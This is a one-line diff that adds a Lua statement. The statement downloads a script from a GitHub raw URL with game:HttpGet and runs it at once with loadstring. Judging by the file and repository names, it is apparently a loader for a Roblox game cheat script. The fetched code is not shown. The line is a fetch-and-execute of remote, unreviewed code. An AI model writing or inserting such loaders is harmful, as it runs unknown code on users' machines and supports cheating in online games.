@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/escape-baby-bobby-daycare-obby-spam3-f2hstoqio1o2w2.lua"))()
